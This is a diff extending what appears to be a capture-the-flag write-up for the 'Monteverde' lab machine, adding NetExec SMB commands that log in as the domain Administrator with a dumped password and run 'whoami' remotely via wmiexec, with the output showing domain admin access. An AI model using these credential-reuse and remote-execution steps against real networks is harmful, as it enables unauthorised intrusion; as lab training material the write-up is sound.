@@ -312,3 +312,21 @@ Password: d0m@in4dminyeah!
 ```
 Using the tool from github i found listed earlier i can dump the credentials of the administrator!
 
+```python
+nxc smb monteverde.megabank.local -u Administrator -p 'd0m@in4dminyeah!'
+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\Administrator:d0m@in4dminyeah! (Pwn3d!)
+```
+
+```python
+nxc smb monteverde.megabank.local -u Administrator -p 'd0m@in4dminyeah!' -X 'whoami'
+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\Administrator:d0m@in4dminyeah! (Pwn3d!)
+SMB         10.129.35.54    445    MONTEVERDE       [+] Executed command via wmiexec
+SMB         10.129.35.54    445    MONTEVERDE       megabank\administrator
+```
+I am now Domain Admin
+
+```python
+
+```
